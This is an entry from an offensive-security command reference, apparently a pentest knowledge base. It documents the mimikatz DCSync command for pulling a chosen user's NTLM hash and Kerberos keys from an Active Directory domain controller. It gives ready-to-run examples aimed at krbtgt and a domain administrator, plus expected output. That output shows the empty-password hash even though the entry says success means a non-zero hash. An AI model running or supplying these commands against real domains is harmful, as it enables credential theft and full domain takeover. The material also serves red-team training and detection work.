---
type: command
executor: mimikatz
data: 'lsadump::dcsync /domain:$_DOMAIN /user:$_USER'
output: null
platforms:
  - Windows
tags:
  - credential-access
  - dcsync
  - mimikatz
verified: true
validated: true
---

# mimikatz-lsadump-dcsync-single-user

## Command

```mimikatz
lsadump::dcsync /domain:$_DOMAIN /user:$_USER
```

## Description

Requests replication of a single user's password data (NTLM hash, Kerberos keys) from the domain controller using MS-DRSR protocol. Ideal for targeting high-value accounts like krbtgt without dumping the entire domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target Active Directory domain name (e.g., htb.local) | Yes |
| $_USER | Username to extract (e.g., krbtgt, administrator) | Yes |
| /domain | Specifies the domain for replication | Built-in |
| /user | Targets a specific user account | Built-in |

## Examples

### Basic Usage

```mimikatz
lsadump::dcsync /domain:htb.local /user:krbtgt
```

### Targeting Admin User

```mimikatz
lsadump::dcsync /domain:corp.example /user:domainadmin
```

## Expected Output

[DC details]
User : krbtgt (S-1-5-21-...-502)
RID : 00000502 (1282)
User password : [NULL]
LM : [NULL]
NTLM : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
...

Includes SID, RID, NTLM hash, and supplemental credentials. Success if hash is non-zero.

## Related

- [[procedures/Mimikatz-DCSync-Password-Hash-Dumping]]
- [[commands/mimikatz-lsadump-dcsync-all-users]]
